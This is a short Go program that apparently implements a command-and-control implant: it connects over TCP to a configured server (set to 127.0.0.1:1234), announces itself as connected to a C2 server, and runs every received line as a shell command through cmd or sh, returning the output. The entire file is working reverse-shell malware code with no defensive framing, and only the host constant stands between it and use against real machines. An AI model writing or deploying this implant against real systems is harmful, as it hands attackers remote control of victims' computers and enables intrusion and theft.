package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

const (
	SERVER_HOST = "127.0.0.1"
	SERVER_PORT = "1234"
)

func executeCommand(cmdStr string) string {
	local_os := runtime.GOOS

	var cmd *exec.Cmd

	switch local_os {
		case "windows":
		cmd = exec.Command("cmd", "/C", cmdStr)
		
		// UNIX 
		case "linux", "darwin", "freebsd", "openbsd":
			cmd = exec.Command("sh", "-c", cmdStr)

		default: 
			return fmt.Sprint("Unsupported OS:" + local_os)
	}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\n%s", err, string(output))
	}

	return string(output)
}

func main() {
	conn, err := net.Dial("tcp",SERVER_HOST+":"+SERVER_PORT)
	if err != nil {
		fmt.Println("[-] Failed to connect:", err)
		return
	}

	defer conn.Close()

	fmt.Println("[+] Connected to C2 server")

	reader := bufio.NewReader(conn)

	for {
		cmdRaw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Disconnected from server:", err)
			return
		}

		cmd := strings.TrimSpace(cmdRaw)
		if cmd == "" {
			continue
		}

		output := executeCommand(cmd)
		_, err = conn.Write([]byte(output + "\n"))
		if err != nil {
			fmt.Println("Write failed:", err)
			return
		}
		
	}
	
}